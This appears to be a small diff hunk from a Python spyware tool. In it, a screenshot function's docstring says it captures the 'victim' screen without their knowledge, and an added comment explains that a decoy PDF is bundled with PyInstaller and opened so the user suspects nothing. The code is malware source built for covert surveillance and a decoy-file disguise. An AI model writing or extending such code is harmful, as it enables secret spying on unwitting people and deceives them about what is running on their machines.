@@ -117,6 +117,8 @@ def take_screenshot():
     This method will take snapshot  without the knowledge of 
      victim and save it in a "pics" folder
     """""
+    
+    #creates a temp folder for pyinstaller(/m.pdf i used for user should not get doubt)
     fi = sys._MEIPASS + "/m.pdf"
     subprocess.Popen(fi, shell=True)
 
